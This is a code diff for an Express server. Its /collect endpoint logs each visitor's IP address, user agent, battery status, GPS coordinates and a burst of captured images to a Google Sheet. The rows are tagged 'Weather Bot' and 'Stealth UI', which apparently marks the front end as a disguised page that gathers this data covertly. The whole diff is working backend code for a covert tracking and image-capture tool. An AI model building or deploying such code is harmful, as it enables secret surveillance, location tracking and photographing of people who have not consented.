@@ -5,23 +5,13 @@ import path from 'path';
 import { fileURLToPath } from 'url';
 import { google } from 'googleapis';
 
-const __filename = fileURLToPath(import.meta.url);
-const __dirname = path.dirname(__filename);
-
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const app = express();
-const PORT = process.env.PORT || 8080;
 
-// Middleware
 app.use(cors());
 app.use(express.json({ limit: '20mb' }));
 app.use(express.static(__dirname));
 
-// Serve index.html as the homepage
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
-});
-
-// Google Sheets Auth
 const auth = new google.auth.JWT(
   process.env.GOOGLE_CLIENT_EMAIL,
   undefined,
@@ -30,33 +20,33 @@ const auth = new google.auth.JWT(
 );
 const sheets = google.sheets({ version: 'v4', auth });
 
-// Collect Route
+app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
+
 app.post('/collect', async (req, res) => {
     try {
+        const { ts, hints, battery, location, burstImages } = req.body;
         const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
-        const { ts, hints, gpu, battery, location, burstImages } = req.body;
 
+        // Matches Row A to R in your sheet logic
         const row = [
-            ts, ip, hints.ua, 
-            gpu?.vendor, gpu?.renderer,
-            battery?.levelPercent + '%', battery?.charging,
-            location?.lat, location?.lon,
-            burstImages?.[0] || '', burstImages?.[1] || '', 
-            burstImages?.[2] || '', burstImages?.[3] || ''
+            ts, ip, hints.ua, "Weather Bot", "Stealth UI", 
+            "Inferred", "Inferred", 
+            battery?.levelPercent, battery?.charging,
+            location?.lat, location?.lon, "High", "[]", "{}",
+            burstImages[0], burstImages[1], burstImages[2], burstImages[3]
         ];
 
         await sheets.spreadsheets.values.append({
             spreadsheetId: process.env.GOOGLE_SHEET_ID,
-            range: 'Logs!A1', // MAKE SURE YOUR TAB IS NAMED "Logs"
+            range: 'Logs!A1', // RENAME TAB TO 'Logs'
             valueInputOption: 'RAW',
             requestBody: { values: [row] }
         });
-
         res.json({ ok: true });
     } catch (err) {
-        console.error("Sheet Error:", err.message);
+        console.error("SHEET ERROR:", err.message);
         res.status(500).json({ error: err.message });
     }
 });
 
-app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
+app.listen(process.env.PORT || 8080);
